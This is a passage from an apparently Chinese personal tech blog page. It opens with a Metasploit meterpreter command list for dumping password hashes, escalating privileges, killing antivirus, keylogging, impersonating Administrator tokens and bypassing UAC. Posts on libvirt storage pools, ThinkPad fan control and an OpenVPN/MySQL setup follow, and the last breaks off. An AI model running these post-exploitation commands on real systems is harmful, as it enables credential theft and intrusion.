aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取hash一般步骤</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>如果是在win2008系统上：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run migrate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1436</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_stop</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用Incognito提权</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token IHAZSECURITY\\Administrator</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查看保护机制并禁用之</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -d -k</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>meterpreter&gt; run checkvm 检查是否是虚拟机</li><li>meterpreter&gt; shell 转入命令行</li><li>meterpreter&gt; run vnc 远程VNC控制</li><li>meterpreter&gt; background 转入后台</li><li>meterpreter&gt; run post/windows/escalate/bypassuac 执行Bypass UAC</li><li>meterpreter&gt; run post/osx/gather/hashdump 在OS X系统上dump hash</li><li>meterpreter&gt; run post/linux/gather/hashdump 在Linux 系统上dump hash</li></ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/msf">msf</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/security">security</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/07/13/libvirt-storage-pool">libvirt中storage pool的管理</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-07-13T00:00:00.000Z" itemprop="datePublished">2012年7月13日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>简单演示如何在libvirt中创建storage pool</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>libvirt提供了存储管理的功能，可以管理的存储类型有 目录  lvm逻辑卷 磁盘 iscsi存储  scsi存储  mpath netfs等，这里以最基本的目录类型为例</p><p>基本概念：</p><p>在libvirt里保存虚拟机磁盘镜像的目录或设备称作存储池  即pool  ，每个虚拟机所使用的虚拟磁盘镜像称作卷 即vol ，vol是存储在pool里面的。</p><p>我们可以使用命令行的virsh工具来管理，pool有两种基本状态：活动和非活动，查看当前存储池的状态</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>新建一个基于目录的存储池bigpool 存储路径为 /bigpool </p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-define-as bigpool dir - - - - /bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool defined</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这时候pool仅仅是定义出来了，可以用pool-list --all查看到。但是相应的目录是不存在的，接着需要建立这个pool</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-build bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool built</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这个时候才是真正的建立起这个pool，libvirt会自动创建/bigpool目录，并设置相应的权限，如果你有用selinux作为libvirt的安全措施的话它还能自动设置上下文</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ls -Zld /bigpool/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwx------ 2 ? root root 4096 Jul 13 12:54 /bigpool/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我这里由于没有使用selinux所以没有上下文的</p><p> pool创建好之后就可以启动了</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-start bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool started</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bigpool active no </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>还可以设置pool为自动启动</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-autostart bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool marked as autostarted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bigpool active yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>基于目录的一个存储池就这样建立完成了，是不是很简单？</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/storage-pool">storage pool</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/05/21/thinkpad-fan-speed-control">如何让ThinkPad自定义风扇转速</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-05-21T00:00:00.000Z" itemprop="datePublished">2012年5月21日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>笔记本长期处于高强度高负荷工作状态，手放到出风口的时候差点被烫伤，再不调整下恐怕到了夏天是彻底扛不住了。于是网上搜了下资料，还好thinkpad一直都有黑客在用...</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>还好thinkpad一直都有黑客在用，因此也不缺乏内核级别的支持，下面记录下配置方法，怕今后再要捣鼓的时候忘记。首先thinkpad有一个专用的acpi驱动叫thinkpad_acpi的内核模块，这个在centos里面已经自带了，它的项目地址<a href="http://ibm-acpi.sf.net/%E3%80%82%E4%B8%8A%E9%9D%A2%E6%9C%89%E5%88%97%E5%87%BA%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%93%AA%E4%BA%9B%E5%9E%8B%E5%8F%B7%E5%93%AA%E4%BA%9B%E5%8A%9F%E8%83%BD%E3%80%82" target="_blank" rel="noopener noreferrer">http://ibm-acpi.sf.net/。上面有列出支持哪些哪些型号哪些功能。</a></p><p>你可以通过lsmod命令查看是否已经加载了此模块:</p><p><code>lsmod|grep think</code></p><p>这个模块加载之后可以通过proc内的文件来查看风扇的运行状态：</p><p><code>cat /proc/acpi/ibm/fan</code></p><p>如果有，那么进入下一步，添加模块的加载选项，创建模块配置文件：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# vi /etc/modprobe.d/thinkpad_acpi.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# cat /etc/modprobe.d/thinkpad_acpi.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">options thinkpad_acpi experimental=1 fan_control=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面的配置将打开自定义风扇转速的开关。</p><p>这个时候需要重新加载模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">modprobe -r thinkpad_acpi &amp;&amp; modprobe thinkpad_acpi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后再查看下proc里面fan文件的状态：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/acpi/ibm/fan</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此时你会发现，信息有变化。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# cat /proc/acpi/ibm/fan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">status: enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">speed: 5485</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">level: auto</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">commands: level &lt;level&gt; (&lt;level&gt; is 0-7, auto, disengaged, full-speed)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">commands: enable, disable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">commands: watchdog &lt;timeout&gt; (&lt;timeout&gt; is 0 (off), 1-120 (seconds))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后我们就可以通过command来控制风扇的转速啦，auto表示自动，disengaged和full-speed一个效果，也可以设置0-7的等级，0表示停止，感兴趣可以试试，反正我不敢试，</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;level  full-speed&quot;  &gt; /proc/acpi/ibm/fan</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意level和full-speed之间只有一个空格..</p><p>再查看fan文件的状态，或者听听风扇转动的声音，你就会发现有明显的变化了，如果模块没有添加fan_control=1的参数的话往/proc/acpi/ibm/fan里面echo信息是不会成功的，会报如下错误：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# echo &quot;level 5&quot; &gt; /proc/acpi/ibm/fan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bash: echo: write error: Invalid argument</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>总结：风扇使劲转起来了，再也不用担心手被烫伤了！</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/thinkpad">thinkpad</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/fan">fan</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2011/09/02/openvpn-mysql-setup">OpenVPN+MySQL环境搭建记录</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2011-09-02T00:00:00.000Z" itemprop="datePublished">2011年9月2日</time> · <!-- -->阅读需 9 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>本文记录了在centos5.5系统中搭建openvpn+mysql+freeradius的过程</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>系统环境：centos5.5</p><p>Eth0：192.168.0.2</p><p>校准系统时间：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ntpdate ntp.api.bz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hwclock -w</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>所需软件包：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum install openssl openssl-devel gcc gcc-c++ mysql mysql-devel mysql-server php php-gd php-devel php-pear php-pear-DB php-mysql php-pdo php-cli php-mbstring php-mcrypt httpd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>下载源码包：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.oberhumer.com/opensource/lzo/download/lzo-2.05.tar.gz</span><br></span><span 